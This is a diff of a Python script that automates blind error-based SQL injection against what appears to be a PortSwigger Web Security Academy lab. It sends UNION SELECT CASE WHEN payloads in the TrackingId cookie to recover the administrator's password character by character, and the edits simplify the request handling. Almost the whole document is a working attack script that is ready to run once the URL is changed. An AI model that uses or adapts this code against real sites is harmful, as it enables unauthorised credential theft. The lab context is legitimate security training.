@@ -1,10 +1,11 @@
 #!/usr/bin/python3
 
 """
-	Variables that may need to be modified:
-		- username & password
-		- pass_length & resp_text_len
-		- payload for TrackingId and session
+	Variable(s) that are required to change:
+		- url
+		
+	Variables that you may need to be modified: 
+		- pass_length, resp_text_len, payload
 """
 
 import requests
@@ -13,28 +14,25 @@ import sys
 
 def main(args):
 
-	username = ''
-	password = ''
 	pass_length = 20 
 	chars = '0123456789abcdefghijklmnopqrstuvwxyz'
-	url = "https://ac4a1f691f04bbee804f1826001b00ad.web-security-academy.net/filter?category=Gifts" 
-	resp_text_len = 21 
+	url = "https://accd1f3a1f9f9df88000013300d60062.web-security-academy.net/filter?category=Gifts" # You MUST change this!
 	passwd = ""
+	resp_text_len = 21 # You may NOT change this.
 	
 	for i in range(1, pass_length + 1): 
 		for c in chars: 
-			tracking_id = f"x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{i},1)='{c}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--"  
-			session_cookie = 'xECM2rdsPYgpYnLiEUN0MCovzFJ7UDes'
-			cookie = "TrackingId={}; session={}".format(tracking_id, session_cookie) 
-			print("Trying payload:", cookie)
-			headers = {'Cookie': cookie}   
-			session = requests.Session()
-			r = session.get(url, headers=headers, auth=(username, password))
+			payload = f"x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{i},1)='{c}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--"
 			
+			print("Trying payload:", payload)
+			r = requests.get(url, headers={'Cookie': f"TrackingId={payload}"} )
+
 			if len(r.text) == resp_text_len:
 				print(f'[+] Password char found: {c}')
 				passwd += c
+				break
 	print(f'The password for administrator is: {passwd}')
+	
 	
 if __name__ == '__main__':
 	main(sys.argv[1:])
